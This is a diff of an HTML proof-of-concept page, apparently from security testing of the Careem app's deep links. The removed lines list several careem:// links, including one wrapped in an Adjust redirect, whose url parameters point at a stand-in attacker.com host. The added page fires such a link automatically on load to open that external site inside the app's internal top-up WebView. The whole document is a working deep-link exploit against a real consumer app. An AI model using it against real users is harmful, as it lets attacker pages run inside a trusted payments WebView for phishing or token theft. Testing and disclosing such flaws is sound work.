@@ -1,6 +1,66 @@
-<a href="careem://pay.careem.com/web-view?url=https://attacker.com"> x</a>
-<a href="careem://pay.careem.com/web-view?link=https://attacker.com"> link</a>
-<a href="careem://pay.careem.com/web-view?deeplink=https://attacker.com"> deep</a>
-<a href="careem://ridehailing.careem.com/topup-partner-webview?url=https://attacker.com"> url</a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deep Link Verification PoC</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            padding: 40px;
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        .container {
+            border: 1px solid #ccc;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #fafafa;
+        }
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+        code {
+            background-color: #eee;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
 
-<a href="https://cp6z.adj.st/x?deep_link=careem%3A%2F%2Fpay.careem.com%2Fweb-view%3Furl%3Dhttps%253A%252F%252Fattacker.com">go</a>
+    <div class="container">
+        <h2>Deep Link Test Page</h2>
+        <p>This page is configured to trigger a custom URI scheme to verify how the application processes parameters passed to internal WebViews.</p>
+        
+        <p><strong>Target URI:</strong> <code>careem://ridehailing.careem.com/topup-partner-webview?url=https://attacker.com</code></p>
+
+        <!-- Manual Trigger Button -->
+        <a href="careem://ridehailing.careem.com/topup-partner-webview?url=https://attacker.com" class="btn">Trigger Deep Link Manually</a>
+    </div>
+
+    <script>
+        // Automatic Trigger
+        // Delays the execution slightly to ensure the DOM is fully loaded
+        window.onload = function() {
+            setTimeout(function() {
+                console.log("Attempting automatic redirection...");
+                window.location.href = "careem://ridehailing.careem.com/topup-partner-webview?url=https://attacker.com";
+            }, 1000); 
+        };
+    </script>
+
+</body>
+</html>
